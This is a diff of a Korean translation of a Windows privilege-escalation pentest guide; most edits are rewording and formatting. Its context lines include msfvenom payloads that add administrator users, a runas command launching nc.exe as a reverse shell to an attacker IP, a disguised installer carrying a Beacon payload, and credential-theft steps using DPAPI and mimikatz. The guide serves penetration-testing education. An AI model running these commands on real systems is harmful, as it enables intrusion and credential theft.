@@ -10,6 +10,7 @@
 
 **Windows 액세스 토큰이 무엇인지 모른다면, 계속하기 전에 다음 페이지를 읽으세요:**
 
+
 {{#ref}}
 access-tokens.md
 {{#endref}}
@@ -17,6 +18,7 @@ access-tokens.md
 ### ACLs - DACLs/SACLs/ACEs
 
 **ACLs - DACLs/SACLs/ACEs에 대한 더 많은 정보는 다음 페이지를 확인하세요:**
+
 
 {{#ref}}
 acls-dacls-sacls-aces.md
@@ -26,13 +28,15 @@ acls-dacls-sacls-aces.md
 
 **Windows에서 무결성 수준이 무엇인지 모른다면, 계속하기 전에 다음 페이지를 읽어야 합니다:**
 
+
 {{#ref}}
 integrity-levels.md
 {{#endref}}
 
 ## Windows 보안 제어
 
-Windows에는 **시스템을 열거하는 것을 방지**하거나 실행 파일을 실행하거나 **활동을 감지하는 것**을 **막을 수 있는** 다양한 요소가 있습니다. 권한 상승 열거를 시작하기 전에 다음 **페이지**를 **읽고** 모든 **방어** **메커니즘**을 **열거**해야 합니다:
+Windows에는 **시스템을 열거하는 것을 방지**하거나 실행 파일을 실행하거나 **활동을 감지하는** 다양한 요소가 있습니다. 권한 상승 열거를 시작하기 전에 **다음 페이지를 읽고** 모든 **방어 메커니즘**을 **열거**해야 합니다:
+
 
 {{#ref}}
 ../authentication-credentials-uac-and-efs/
@@ -180,7 +184,7 @@ PSProvider   : Microsoft.PowerShell.Core\Registry
 
 그렇다면, **악용 가능하다.** 마지막 레지스트리가 0과 같다면, WSUS 항목은 무시될 것이다.
 
-이 취약점을 악용하기 위해서는 다음과 같은 도구를 사용할 수 있다: [Wsuxploit](https://github.com/pimps/wsuxploit), [pyWSUS ](https://github.com/GoSecure/pywsus) - 이들은 비SSL WSUS 트래픽에 '가짜' 업데이트를 주입하기 위한 MiTM 무기화된 익스플로잇 스크립트이다.
+이 취약점을 악용하기 위해서는 다음과 같은 도구를 사용할 수 있다: [Wsuxploit](https://github.com/pimps/wsuxploit), [pyWSUS ](https://github.com/GoSecure/pywsus) - 이는 비SSL WSUS 트래픽에 '가짜' 업데이트를 주입하기 위한 MiTM 무기화된 익스플로잇 스크립트이다.
 
 여기에서 연구를 읽어보세요:
 
@@ -195,7 +199,7 @@ CTX_WSUSpect_White_Paper (1).pdf
 
 > 우리가 로컬 사용자 프록시를 수정할 수 있는 권한이 있고, Windows 업데이트가 Internet Explorer의 설정에 구성된 프록시를 사용한다면, 우리는 [PyWSUS](https://github.com/GoSecure/pywsus)를 로컬에서 실행하여 자신의 트래픽을 가로채고 자산에서 상승된 사용자로서 코드를 실행할 수 있는 권한을 가지게 된다.
 >
-> 게다가, WSUS 서비스는 현재 사용자의 설정을 사용하므로, 현재 사용자의 인증서 저장소도 사용할 것이다. WSUS 호스트 이름에 대해 자체 서명된 인증서를 생성하고 이 인증서를 현재 사용자의 인증서 저장소에 추가하면, HTTP 및 HTTPS WSUS 트래픽을 모두 가로챌 수 있다. WSUS는 인증서에 대한 신뢰-첫-사용 유형 검증을 구현하기 위해 HSTS와 유사한 메커니즘을 사용하지 않는다. 제시된 인증서가 사용자에 의해 신뢰되고 올바른 호스트 이름을 가지고 있다면, 서비스에 의해 수용될 것이다.
+> 게다가, WSUS 서비스는 현재 사용자의 설정을 사용하므로, 현재 사용자의 인증서 저장소도 사용할 것이다. WSUS 호스트 이름에 대해 자체 서명된 인증서를 생성하고 이 인증서를 현재 사용자의 인증서 저장소에 추가하면, HTTP 및 HTTPS WSUS 트래픽을 모두 가로챌 수 있게 된다. WSUS는 인증서에 대한 신뢰-첫-사용 유형 검증을 구현하기 위해 HSTS와 유사한 메커니즘을 사용하지 않는다. 제시된 인증서가 사용자에 의해 신뢰되고 올바른 호스트 이름을 가지고 있다면, 서비스에 의해 수용될 것이다.
 
 이 취약점을 [**WSUSpicious**](https://github.com/GoSecure/wsuspicious) 도구를 사용하여 악용할 수 있다 (해방되면).
 
@@ -209,7 +213,7 @@ CTX_WSUSpect_White_Paper (1).pdf
 
 ## AlwaysInstallElevated
 
-**이** 2개의 레지스터가 **활성화되어** 있다면 (값이 **0x1**), 모든 권한의 사용자가 NT AUTHORITY\\**SYSTEM**으로 `*.msi` 파일을 **설치** (실행)할 수 있다.
+**이** 2개의 레지스터가 **활성화**되어 있다면 (값이 **0x1**), 모든 권한의 사용자가 NT AUTHORITY\\**SYSTEM**으로 `*.msi` 파일을 **설치**(실행)할 수 있다.
 ```bash
 reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
 reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
@@ -219,11 +223,11 @@ reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallEle
 msfvenom -p windows/adduser USER=rottenadmin PASS=P@ssword123! -f msi-nouac -o alwe.msi #No uac format
 msfvenom -p windows/adduser USER=rottenadmin PASS=P@ssword123! -f msi -o alwe.msi #Using the msiexec the uac wont be prompted
 ```
-만약 meterpreter 세션이 있다면, **`exploit/windows/local/always_install_elevated`** 모듈을 사용하여 이 기술을 자동화할 수 있습니다.
+If you have a meterpreter session you can automate this technique using the module **`exploit/windows/local/always_install_elevated`**
 
 ### PowerUP
 
-`Write-UserAddMSI` 명령을 power-up에서 사용하여 현재 디렉토리 내에 권한 상승을 위한 Windows MSI 바이너리를 생성합니다. 이 스크립트는 사용자/그룹 추가를 요청하는 미리 컴파일된 MSI 설치 프로그램을 작성합니다(따라서 GIU 접근이 필요합니다):
+`Write-UserAddMSI` 명령을 사용하여 현재 디렉토리 내에 권한 상승을 위한 Windows MSI 바이너리를 생성합니다. 이 스크립트는 사용자/그룹 추가를 요청하는 미리 컴파일된 MSI 설치 프로그램을 작성합니다(따라서 GIU 접근이 필요합니다):
 ```
 Write-UserAddMSI
 ```
@@ -231,7 +235,7 @@ Just execute the created binary to escalate privileges.
 
 ### MSI Wrapper
 
-이 튜토리얼을 읽고 이 도구를 사용하여 MSI 래퍼를 만드는 방법을 배우세요. **명령줄을 실행**하려는 경우 "**.bat**" 파일을 래핑할 수 있습니다.
+이 튜토리얼을 읽고 이 도구를 사용하여 MSI 래퍼를 만드는 방법을 배우세요. **명령줄**을 **실행**하려는 경우 "**.bat**" 파일을 래핑할 수 있습니다.
 
 {{#ref}}
 msi-wrapper.md
@@ -247,8 +251,8 @@ create-msi-with-wix.md
 
 - **Cobalt Strike** 또는 **Metasploit**를 사용하여 `C:\privesc\beacon.exe`에 **새 Windows EXE TCP 페이로드**를 **생성**합니다.
 - **Visual Studio**를 열고 **새 프로젝트 만들기**를 선택한 후 검색 상자에 "installer"를 입력합니다. **Setup Wizard** 프로젝트를 선택하고 **Next**를 클릭합니다.
-- 프로젝트 이름을 **AlwaysPrivesc**로 지정하고, 위치에 **`C:\privesc`**를 사용하며, **솔루션과 프로젝트를 동일한 디렉터리에 배치**를 선택하고 **Create**를 클릭합니다.
-- 4단계 중 3단계(포함할 파일 선택)에 도달할 때까지 **Next**를 계속 클릭합니다. **Add**를 클릭하고 방금 생성한 Beacon 페이로드를 선택합니다. 그런 다음 **Finish**를 클릭합니다.
+- 프로젝트 이름을 **AlwaysPrivesc**로 지정하고 위치에 **`C:\privesc`**를 사용하며, **솔루션과 프로젝트를 동일한 디렉터리에 배치**를 선택하고 **Create**를 클릭합니다.
+- **Next**를 계속 클릭하여 4단계 중 3단계(포함할 파일 선택)에 도달합니다. **Add**를 클릭하고 방금 생성한 Beacon 페이로드를 선택합니다. 그런 다음 **Finish**를 클릭합니다.
 - **Solution Explorer**에서 **AlwaysPrivesc** 프로젝트를 강조 표시하고 **Properties**에서 **TargetPlatform**을 **x86**에서 **x64**로 변경합니다.
 - 설치된 앱이 더 합법적으로 보이도록 **Author** 및 **Manufacturer**와 같은 다른 속성을 변경할 수 있습니다.
 - 프로젝트를 마우스 오른쪽 버튼으로 클릭하고 **View > Custom Actions**를 선택합니다.
@@ -304,22 +308,22 @@ reg query 'HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\LSA' /v RunAsPPL
 ```
 ### Credentials Guard
 
-**Credential Guard**는 **Windows 10**에서 도입되었습니다. 그 목적은 패스 더 해시 공격과 같은 위협으로부터 장치에 저장된 자격 증명을 보호하는 것입니다.| [**Credentials Guard에 대한 자세한 정보는 여기에서 확인하세요.**](../stealing-credentials/credentials-protections.md#credential-guard)
+**Credential Guard**는 **Windows 10**에서 도입되었습니다. 그 목적은 패스-더-해시 공격과 같은 위협으로부터 장치에 저장된 자격 증명을 보호하는 것입니다.| [**자격 증명 가드에 대한 자세한 정보는 여기에서 확인하세요.**](../stealing-credentials/credentials-protections.md#credential-guard)
 ```bash
 reg query 'HKLM\System\CurrentControlSet\Control\LSA' /v LsaCfgFlags
 ```
 ### 캐시된 자격 증명
 
 **도메인 자격 증명**은 **로컬 보안 권한**(LSA)에 의해 인증되며 운영 체제 구성 요소에서 사용됩니다. 사용자의 로그인 데이터가 등록된 보안 패키지에 의해 인증되면, 일반적으로 사용자의 도메인 자격 증명이 설정됩니다.\
-[**캐시된 자격 증명에 대한 자세한 정보는 여기에서 확인하세요**](../stealing-credentials/credentials-protections.md#cached-credentials).
+[**캐시된 자격 증명에 대한 자세한 정보는 여기**](../stealing-credentials/credentials-protections.md#cached-credentials)에서 확인하세요.
 ```bash
 reg query "HKEY_LOCAL_MACHINE\SOFTWARE\MICROSOFT\WINDOWS NT\CURRENTVERSION\WINLOGON" /v CACHEDLOGONSCOUNT
 ```
-## 사용자 및 그룹
+## Users & Groups
 
-### 사용자 및 그룹 나열
+### Enumerate Users & Groups
 
-소속된 그룹 중 흥미로운 권한이 있는지 확인해야 합니다.
+당신이 속한 그룹 중에 흥미로운 권한이 있는지 확인해야 합니다.
 ```bash
 # CMD
 net users %username% #Me
@@ -338,6 +342,7 @@ Get-LocalGroupMember Administrators | ft Name, PrincipalSource
 
 당신이 **특권 그룹에 속한다면 권한 상승을 할 수 있습니다**. 특권 그룹에 대해 배우고 이를 악용하여 권한을 상승시키는 방법은 여기에서 확인하세요:
 
+
 {{#ref}}
 ../active-directory-methodology/privileged-groups-and-token-privileges.md
 {{#endref}}
@@ -346,6 +351,7 @@ Get-LocalGroupMember Administrators | ft Name, PrincipalSource
 
 **더 알아보세요** 이 페이지에서 **토큰**이 무엇인지: [**Windows Tokens**](../authentication-credentials-uac-and-efs/index.html#access-tokens).\
 다음 페이지를 확인하여 **흥미로운 토큰에 대해 배우고** 이를 악용하는 방법을 알아보세요:
+
 
 {{#ref}}
 privilege-escalation-abusing-tokens.md
@@ -410,13 +416,13 @@ todos %username%" && echo.
 ```bash
 procdump.exe -accepteula -ma <proc_name_tasklist>
 ```
-### 안전하지 않은 GUI 앱
+### Insecure GUI apps
 
 **SYSTEM으로 실행되는 애플리케이션은 사용자가 CMD를 실행하거나 디렉토리를 탐색할 수 있도록 허용할 수 있습니다.**
 
 예: "Windows 도움말 및 지원" (Windows + F1), "명령 프롬프트" 검색, "명령 프롬프트 열기 클릭" 클릭
 
-## 서비스
+## Services
 
 서비스 목록 가져오기:
 ```bash
@@ -427,7 +433,7 @@ Get-Service
 ```
 ### 권한
 
-**sc**를 사용하여 서비스 정보를 얻을 수 있습니다.
+You can use **sc** to get information of a service
 ```bash
 sc qc <service_name>
 ```
@@ -442,7 +448,7 @@ accesschk.exe -uwcqv %USERNAME% * /accepteula
 accesschk.exe -uwcqv "BUILTIN\Users" * /accepteula 2>nul
 accesschk.exe -uwcqv "Todos" * /accepteula ::Spanish version
 ```
-[여기에서 XP용 accesschk.exe를 다운로드할 수 있습니다](https://github.com/ankh2054/windows-pentest/raw/master/Privelege/accesschk-2003-xp.exe)
+[accesschk.exe를 XP용으로 여기서 다운로드할 수 있습니다](https://github.com/ankh2054/windows-pentest/raw/master/Privelege/accesschk-2003-xp.exe)
 
 ### 서비스 활성화
 
@@ -489,7 +495,7 @@ net stop [service name] && net start [service name]
 
 ### 서비스 바이너리의 약한 권한
 
-**서비스에 의해 실행되는 바이너리를 수정할 수 있는지 확인**하거나 **바이너리가 위치한 폴더에 대한 쓰기 권한이 있는지 확인**하세요 ([**DLL Hijacking**](dll-hijacking/index.html))**.**\
+**서비스에 의해 실행되는 바이너리를 수정할 수 있는지** 또는 **바이너리가 위치한 폴더에 대한 쓰기 권한이 있는지 확인하십시오** ([**DLL Hijacking**](dll-hijacking/index.html))**.**\
 **wmic**를 사용하여 서비스에 의해 실행되는 모든 바이너리를 가져오고 (system32가 아님) **icacls**를 사용하여 권한을 확인할 수 있습니다:
 ```bash
 for /f "tokens=2 delims='='" %a in ('wmic service list full^|find /i "pathname"^|find /i /v "system32"') do @echo %a >> %temp%\perm.txt
@@ -502,7 +508,7 @@ sc query state= all | findstr "SERVICE_NAME:" >> C:\Temp\Servicenames.txt
 FOR /F "tokens=2 delims= " %i in (C:\Temp\Servicenames.txt) DO @echo %i >> C:\Temp\services.txt
 FOR /F %i in (C:\Temp\services.txt) DO @sc qc %i | findstr "BINARY_PATH_NAME" >> C:\Temp\path.txt
 ```
-### 서비스 레지스트리 수정 권한
+### Services registry modify permissions
 
 서비스 레지스트리를 수정할 수 있는지 확인해야 합니다.\
 서비스 **레지스트리**에 대한 **권한**을 확인하려면 다음을 수행하십시오:
@@ -523,6 +529,7 @@ reg add HKLM\SYSTEM\CurrentControlSet\services\<service_name> /v ImagePath /t RE
 ### Services registry AppendData/AddSubdirectory permissions
 
 이 권한이 레지스트리에 있으면 **이 레지스트리에서 하위 레지스트리를 생성할 수 있습니다**. Windows 서비스의 경우 이는 **임의 코드를 실행하기에 충분합니다:**
+
 
 {{#ref}}
 appenddata-addsubdirectory-permission-over-service-registry.md
@@ -558,7 +565,7 @@ echo %%~s | findstr /r /c:"[a-Z][ ][a-Z]" >nul 2>&1 && (echo %%n && echo %%~s &&
 ```bash
 gwmi -class Win32_Service -Property Name, DisplayName, PathName, StartMode | Where {$_.StartMode -eq "Auto" -and $_.PathName -notlike "C:\Windows*" -and $_.PathName -notlike '"*'} | select PathName,DisplayName,Name
 ```
-**이 취약점을 탐지하고 악용할 수 있습니다** metasploit를 사용하여: `exploit/windows/local/trusted\_service\_path` metasploit를 사용하여 서비스 바이너리를 수동으로 생성할 수 있습니다:
+**이 취약점을 탐지하고 악용할 수 있습니다** 메타스플로잇을 사용하여: `exploit/windows/local/trusted\_service\_path` 메타스플로잇을 사용하여 서비스 바이너리를 수동으로 생성할 수 있습니다:
 ```bash
 msfvenom -p windows/exec CMD="net localgroup administrators username /add" -f exe-service -o service.exe
 ```
@@ -611,6 +618,7 @@ Get-ChildItem 'C:\Program Files\*','C:\Program Files (x86)\*' | % { try { Get-Ac
 **다른 사용자가 실행할 레지스트리나 바이너리를 덮어쓸 수 있는지 확인하세요.**\
 **다음 페이지를 읽어** **권한 상승을 위한 흥미로운 autoruns 위치**에 대해 더 알아보세요:
 
+
 {{#ref}}
 privilege-escalation-with-autorun-binaries.md
 {{#endref}}
@@ -625,13 +633,13 @@ driverquery /SI
 ```
 ## PATH DLL Hijacking
 
-**PATH에 있는 폴더 내에 쓰기 권한이 있는 경우** 프로세스에 의해 로드된 DLL을 하이재킹하고 **권한을 상승시킬 수** 있습니다.
+**PATH에 있는 폴더 내에서 쓰기 권한이 있는 경우** 프로세스에 의해 로드된 DLL을 하이재킹하고 **권한을 상승시킬 수** 있습니다.
 
 PATH 내 모든 폴더의 권한을 확인하세요:
 ```bash
 for %%A in ("%path:;=";"%") do ( cmd.exe /c icacls "%%~A" 2>nul | findstr /i "(F) (M) (W) :\" | findstr /i ":\\ everyone authenticated users todos %username%" && echo. )
 ```
-이 체크를 악용하는 방법에 대한 자세한 정보는 다음을 참조하세요:
+이 검사를 악용하는 방법에 대한 자세한 정보는 다음을 참조하십시오:
 
 {{#ref}}
 dll-hijacking/writable-sys-path-+dll-hijacking-privesc.md
@@ -659,7 +667,7 @@ ipconfig /all
 Get-NetIPConfiguration | ft InterfaceAlias,InterfaceDescription,IPv4Address
 Get-DnsClientServerAddress -AddressFamily IPv4 | ft
 ```
-### 열린 포트
+### Open Ports
 
 외부에서 **제한된 서비스**를 확인하세요.
 ```bash
@@ -679,9 +687,9 @@ Get-NetNeighbor -AddressFamily IPv4 | ft ifIndex,IPAddress,L
 
 [**방화벽 관련 명령어는 이 페이지를 확인하세요**](../basic-cmd-for-pentesters.md#firewall) **(규칙 목록, 규칙 생성, 끄기, 끄기...)**
 
-더 많은 [네트워크 열거를 위한 명령어는 여기](../basic-cmd-for-pentesters.md#network)에서 확인하세요.
+네트워크 열거를 위한 더 많은[ 명령어는 여기](../basic-cmd-for-pentesters.md#network)에서 확인하세요.
 
-### Windows Subsystem for Linux (wsl)
+### 윈도우 리눅스 하위 시스템 (wsl)
 ```bash
 C:\Windows\System32\bash.exe
 C:\Windows\System32\wsl.exe
@@ -718,9 +726,9 @@ reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v AltDef
 From [https://www.neowin.net/news/windows-7-exploring-credential-manager-and-windows-vault](https://www.neowin.net/news/windows-7-exploring-credential-manager-and-windows-vault)\
 Windows 금고는 **Windows**가 **사용자를 자동으로 로그인**할 수 있는 서버, 웹사이트 및 기타 프로그램에 대한 사용자 자격 증명을 저장합니다. 처음에는 사용자가 Facebook 자격 증명, Twitter 자격 증명, Gmail 자격 증명 등을 저장하여 브라우저를 통해 자동으로 로그인할 수 있는 것처럼 보일 수 있습니다. 하지만 그렇지 않습니다.
 
-Windows 금고는 Windows가 사용자를 자동으로 로그인할 수 있는 자격 증명을 저장합니다. 이는 **자원에 접근하기 위해 자격 증명이 필요한 모든 Windows 애플리케이션**이 이 자격 증명 관리자 및 Windows 금고를 사용하여 사용자가 항상 사용자 이름과 비밀번호를 입력하는 대신 제공된 자격 증명을 사용할 수 있음을 의미합니다.
+Windows 금고는 Windows가 사용자를 자동으로 로그인할 수 있는 자격 증명을 저장합니다. 이는 **리소스에 접근하기 위해 자격 증명이 필요한 모든 Windows 애플리케이션**이 이 자격 증명 관리자 및 Windows 금고를 사용하여 사용자가 항상 사용자 이름과 비밀번호를 입력하는 대신 제공된 자격 증명을 사용할 수 있음을 의미합니다.
 
-애플리케이션이 자격 증명 관리자와 상호 작용하지 않는 한, 특정 자원에 대한 자격 증명을 사용하는 것은 불가능하다고 생각합니다. 따라서 애플리케이션이 금고를 사용하려면 어떤 식으로든 **자격 증명 관리자와 통신하여 해당 자원에 대한 자격 증명을 기본 저장 금고에서 요청해야** 합니다.
+애플리케이션이 자격 증명 관리자와 상호 작용하지 않는 한, 특정 리소스에 대한 자격 증명을 사용하는 것은 불가능하다고 생각합니다. 따라서 애플리케이션이 금고를 사용하려면 어떤 식으로든 **자격 증명 관리자와 통신하여 기본 저장 금고에서 해당 리소스에 대한 자격 증명을 요청해야 합니다**.
 
 `cmdkey`를 사용하여 머신에 저장된 자격 증명을 나열합니다.
 ```bash
@@ -734,7 +742,7 @@ User: WORKGROUP\Administrator
 ```bash
 runas /savecred /user:WORKGROUP\Administrator "\\10.XXX.XXX.XXX\SHARE\evil.exe"
 ```
-`runas`를 제공된 자격 증명 세트와 함께 사용합니다.
+제공된 자격 증명을 사용하여 `runas` 실행.
 ```bash
 C:\Windows\System32\runas.exe /env /noprofile /user:<username> <password> "c:\users\Public\nc.exe -nc <attacker-ip> 4444 -e cmd.exe"
 ```
@@ -744,14 +752,14 @@ C:\Windows\System32\runas.exe /env /noprofile /user:<username> <password> "c:\us
 
 **데이터 보호 API (DPAPI)**는 데이터의 대칭 암호화를 위한 방법을 제공하며, 주로 Windows 운영 체제 내에서 비대칭 개인 키의 대칭 암호화에 사용됩니다. 이 암호화는 사용자 또는 시스템 비밀을 활용하여 엔트로피에 크게 기여합니다.
 
-**DPAPI는 사용자의 로그인 비밀에서 파생된 대칭 키를 통해 키의 암호화를 가능하게 합니다**. 시스템 암호화가 포함된 시나리오에서는 시스템의 도메인 인증 비밀을 사용합니다.
+**DPAPI는 사용자의 로그인 비밀로부터 파생된 대칭 키를 통해 키의 암호화를 가능하게 합니다**. 시스템 암호화가 포함된 시나리오에서는 시스템의 도메인 인증 비밀을 사용합니다.
 
 DPAPI를 사용하여 암호화된 사용자 RSA 키는 `%APPDATA%\Microsoft\Protect\{SID}` 디렉토리에 저장되며, 여기서 `{SID}`는 사용자의 [보안 식별자](https://en.wikipedia.org/wiki/Security_Identifier)를 나타냅니다. **DPAPI 키는 사용자의 개인 키를 보호하는 마스터 키와 동일한 파일에 위치하며**, 일반적으로 64바이트의 임의 데이터로 구성됩니다. (이 디렉토리에 대한 접근은 제한되어 있어 CMD의 `dir` 명령어로 내용을 나열할 수 없지만, PowerShell을 통해 나열할 수 있습니다).
 ```bash
 Get-ChildItem  C:\Users\USER\AppData\Roaming\Microsoft\Protect\
 Get-ChildItem  C:\Users\USER\AppData\Local\Microsoft\Protect\
 ```
-**mimikatz 모듈** `dpapi::masterkey`를 적절한 인수(`/pvk` 또는 `/rpc`)와 함께 사용하여 이를 복호화할 수 있습니다.
+당신은 적절한 인수(`/pvk` 또는 `/rpc`)와 함께 **mimikatz 모듈** `dpapi::masterkey`를 사용하여 이를 복호화할 수 있습니다.
 
 **마스터 비밀번호로 보호된 자격 증명 파일**은 일반적으로 다음 위치에 있습니다:
 ```bash
@@ -769,7 +777,7 @@ dpapi-extracting-passwords.md
 
 ### PowerShell Credentials
 
-**PowerShell credentials**는 **스크립팅** 및 자동화 작업을 위해 암호화된 자격 증명을 편리하게 저장하는 방법으로 자주 사용됩니다. 자격 증명은 **DPAPI**를 사용하여 보호되며, 이는 일반적으로 동일한 컴퓨터에서 동일한 사용자에 의해서만 복호화될 수 있음을 의미합니다.
+**PowerShell credentials**는 종종 **스크립팅** 및 자동화 작업을 위해 암호화된 자격 증명을 편리하게 저장하는 방법으로 사용됩니다. 자격 증명은 **DPAPI**를 사용하여 보호되며, 이는 일반적으로 동일한 컴퓨터에서 동일한 사용자에 의해서만 복호화될 수 있음을 의미합니다.
 
 PS 자격 증명을 포함하는 파일에서 **복호화**하려면 다음과 같이 할 수 있습니다:
 ```bash
@@ -810,7 +818,7 @@ Mimikatz `sekurlsa::dpapi` 모듈을 사용하여 메모리에서 **많은 DPAPI
 
 ### Sticky Notes
 
-사람들은 종종 Windows 워크스테이션에서 StickyNotes 앱을 사용하여 **비밀번호** 및 기타 정보를 저장하지만, 이것이 데이터베이스 파일이라는 것을 인식하지 못합니다. 이 파일은 `C:\Users\<user>\AppData\Local\Packages\Microsoft.MicrosoftStickyNotes_8wekyb3d8bbwe\LocalState\plum.sqlite`에 위치하며, 항상 검색하고 검토할 가치가 있습니다.
+사람들은 종종 Windows 워크스테이션에서 StickyNotes 앱을 사용하여 **비밀번호** 및 기타 정보를 저장하지만, 이것이 데이터베이스 파일이라는 것을 인식하지 못합니다. 이 파일은 `C:\Users\<user>\AppData\Local\Packages\Microsoft.MicrosoftStickyNotes_8wekyb3d8bbwe\LocalState\plum.sqlite`에 위치하며 항상 검색하고 검토할 가치가 있습니다.
 
 ### AppCmd.exe
 
@@ -928,8 +936,8 @@ reg query 'HKEY_CURRENT_USER\Software\OpenSSH\Agent\Keys'
 ```bash
 Get-Service ssh-agent | Set-Service -StartupType Automatic -PassThru | Start-Service
 ```
-> [!NOTE]
-> 이 기술은 더 이상 유효하지 않은 것 같습니다. 저는 ssh 키를 생성하고 `ssh-add`로 추가한 후 ssh를 통해 머신에 로그인하려고 했습니다. 레지스트리 HKCU\Software\OpenSSH\Agent\Keys가 존재하지 않으며 procmon은 비대칭 키 인증 중 `dpapi.dll`의 사용을 식별하지 못했습니다.
+> [!TIP]
+> 이 기술은 더 이상 유효하지 않은 것 같습니다. 나는 몇 개의 ssh 키를 생성하고 `ssh-add`로 추가한 후 ssh를 통해 머신에 로그인하려고 했습니다. 레지스트리 HKCU\Software\OpenSSH\Agent\Keys가 존재하지 않으며 procmon은 비대칭 키 인증 중 `dpapi.dll`의 사용을 식별하지 못했습니다.
 
 ### Unattended files
 ```
@@ -946,7 +954,7 @@ C:\unattend.txt
 C:\unattend.inf
 dir /s *sysprep.inf *sysprep.xml *unattended.xml *unattend.xml *unattend.txt 2>nul
 ```
-이 파일은 **metasploit**를 사용하여 검색할 수도 있습니다: _post/windows/gather/enum_unattend_
+이 파일들은 **metasploit**를 사용하여 검색할 수도 있습니다: _post/windows/gather/enum_unattend_
 ```xml
 <component name="Microsoft-Windows-Shell-Setup" publicKeyToken="31bf3856ad364e35" language="neutral" versionScope="nonSxS" processorArchitecture="amd64">
 <AutoLogon>
@@ -987,15 +995,15 @@ AppData\Roaming\gcloud\access_tokens.db
 ```
 ### McAfee SiteList.xml
 
-**SiteList.xml**라는 파일을 검색하십시오.
+**SiteList.xml**라는 파일을 검색하세요.
 
 ### Cached GPP Pasword
 
 이전에는 Group Policy Preferences (GPP)를 통해 여러 머신에 사용자 지정 로컬 관리자 계정을 배포할 수 있는 기능이 제공되었습니다. 그러나 이 방법에는 심각한 보안 결함이 있었습니다. 첫째, SYSVOL에 XML 파일로 저장된 Group Policy Objects (GPOs)는 모든 도메인 사용자가 접근할 수 있었습니다. 둘째, 공개적으로 문서화된 기본 키를 사용하여 AES256으로 암호화된 이러한 GPP 내의 비밀번호는 인증된 사용자가 복호화할 수 있었습니다. 이는 사용자가 권한 상승을 할 수 있는 심각한 위험을 초래했습니다.
 
-이 위험을 완화하기 위해, 비어 있지 않은 "cpassword" 필드를 포함하는 로컬 캐시 GPP 파일을 검색하는 기능이 개발되었습니다. 이러한 파일을 찾으면, 해당 기능은 비밀번호를 복호화하고 사용자 지정 PowerShell 객체를 반환합니다. 이 객체에는 GPP에 대한 세부정보와 파일의 위치가 포함되어 있어 이 보안 취약점을 식별하고 수정하는 데 도움이 됩니다.
+이 위험을 완화하기 위해, 비어 있지 않은 "cpassword" 필드를 포함하는 로컬 캐시된 GPP 파일을 검색하는 기능이 개발되었습니다. 이러한 파일을 찾으면, 해당 기능은 비밀번호를 복호화하고 사용자 지정 PowerShell 객체를 반환합니다. 이 객체에는 GPP에 대한 세부정보와 파일의 위치가 포함되어 있어 이 보안 취약점을 식별하고 수정하는 데 도움이 됩니다.
 
-다음 파일을 위해 `C:\ProgramData\Microsoft\Group Policy\history` 또는 _**C:\Documents and Settings\All Users\Application Data\Microsoft\Group Policy\history** (W Vista 이전)_에서 검색하십시오:
+다음 파일을 위해 `C:\ProgramData\Microsoft\Group Policy\history` 또는 _**C:\Documents and Settings\All Users\Application Data\Microsoft\Group Policy\history** (W Vista 이전)_에서 검색하세요:
 
 - Groups.xml
 - Services.xml
@@ -1183,15 +1191,16 @@ reg query "HKCU\Software\OpenSSH\Agent\Key"
 
 **컴포넌트 오브젝트 모델 (COM)**은 서로 다른 언어의 소프트웨어 구성 요소 간의 **상호 통신**을 허용하는 Windows 운영 체제 내에 구축된 기술입니다. 각 COM 구성 요소는 **클래스 ID (CLSID)**를 통해 **식별**되며, 각 구성 요소는 인터페이스 ID (IIDs)를 통해 식별되는 하나 이상의 인터페이스를 통해 기능을 노출합니다.
 
-COM 클래스와 인터페이스는 각각 **HKEY\CLASSES\ROOT\CLSID** 및 **HKEY\CLASSES\ROOT\Interface** 레지스트리에 정의됩니다. 이 레지스트리는 **HKEY\LOCAL\MACHINE\Software\Classes** + **HKEY\CURRENT\USER\Software\Classes**를 병합하여 생성됩니다 = **HKEY\CLASSES\ROOT.**
+COM 클래스와 인터페이스는 각각 **HKEY\CLASSES\ROOT\CLSID** 및 **HKEY\CLASSES\ROOT\Interface** 레지스트리에 정의됩니다. 이 레지스트리는 **HKEY\LOCAL\MACHINE\Software\Classes** + **HKEY\CURRENT\USER\Software\Classes** = **HKEY\CLASSES\ROOT**를 병합하여 생성됩니다.
 
-이 레지스트리의 CLSID 내부에는 **InProcServer32**라는 자식 레지스트리가 있으며, 여기에는 **DLL**을 가리키는 **기본값**과 **ThreadingModel**이라는 값이 포함되어 있습니다. 이 값은 **Apartment** (단일 스레드), **Free** (다중 스레드), **Both** (단일 또는 다중) 또는 **Neutral** (스레드 중립)일 수 있습니다.
+이 레지스트리의 CLSID 내에서 **InProcServer32**라는 자식 레지스트리를 찾을 수 있으며, 여기에는 **DLL**을 가리키는 **기본값**과 **ThreadingModel**이라는 값이 포함되어 있습니다. 이 값은 **Apartment** (단일 스레드), **Free** (다중 스레드), **Both** (단일 또는 다중) 또는 **Neutral** (스레드 중립)일 수 있습니다.
 
 ![](<../../images/image (729).png>)
 
 기본적으로, 실행될 DLL 중 하나를 **덮어쓸 수 있다면**, 해당 DLL이 다른 사용자에 의해 실행될 경우 **권한 상승**을 할 수 있습니다.
 
 공격자가 COM 하이재킹을 지속성 메커니즘으로 사용하는 방법을 배우려면 확인하세요:
+
 
 {{#ref}}
 com-hijacking.md
@@ -1222,7 +1231,7 @@ REG QUERY HKCU /F "password" /t REG_SZ /S /d
 
 [**MSF-Credentials Plugin**](https://github.com/carlospolop/MSF-Credentials) **는 msf** 플러그인으로, 이 플러그인은 **희생자의 내부에서 자격 증명을 검색하는 모든 메타스플로잇 POST 모듈을 자동으로 실행**하도록 만들어졌습니다.\
 [**Winpeas**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite) 는 이 페이지에 언급된 비밀번호가 포함된 모든 파일을 자동으로 검색합니다.\
-[**Lazagne**](https://github.com/AlessandroZ/LaZagne) 는 시스템에서 비밀번호를 추출하는 또 다른 훌륭한 도구입니다.
+[**Lazagne**](https://github.com/AlessandroZ/LaZagne) 은 시스템에서 비밀번호를 추출하는 또 다른 훌륭한 도구입니다.
 
